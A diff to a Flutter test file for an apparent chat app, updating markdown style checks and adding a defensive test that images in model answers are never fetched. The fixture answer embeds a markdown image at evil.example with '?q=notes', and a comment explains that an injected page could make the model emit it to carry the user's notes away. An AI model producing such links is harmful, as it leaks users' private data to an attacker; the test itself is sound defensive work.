@@ -1539,14 +1539,37 @@ void main() {
         sheet.em,
         sheet.h1,
         sheet.h3,
-        sheet.a,
         sheet.code,
       ].map((s) => s!.color),
       everyElement(ink),
     );
+    // A link looks like one: the theme's primary colour, underlined.
+    final theme = Theme.of(tester.element(find.byType(MarkdownBody)));
+    expect(sheet.a!.color, theme.colorScheme.primary);
+    expect(sheet.a!.decoration, TextDecoration.underline);
+    // Code in a monospace face on every platform, not only where "monospace" exists.
+    expect(sheet.code!.fontFamilyFallback, containsAll(['Menlo', 'Consolas']));
     await tapOnPart(tester, 'the docs');
     await tester.pump();
     expect(launcher.opened, ['https://example.com/d']);
+  });
+
+  testWidgets('chat: an image in an answer is never fetched; its words show instead (#305)', (
+    tester,
+  ) async {
+    phone(tester);
+    // A page the model read could ask for this: the address would carry the notes away.
+    await pumpApp(
+      tester,
+      Harness(answers: ['Done. ![a chart](https://evil.example/p.png?q=notes)']),
+    );
+    await connect(tester, key: 'k');
+    await tester.enterText(find.byKey(const Key('message')), 'hi');
+    await tester.pump();
+    await tester.tap(find.byTooltip('Send'));
+    await tester.pumpAndSettle();
+    expect(find.byType(Image), findsNothing);
+    expect(find.text('a chart'), findsOneWidget);
   });
 
   testWidgets('notes: saved links open in the browser', (tester) async {
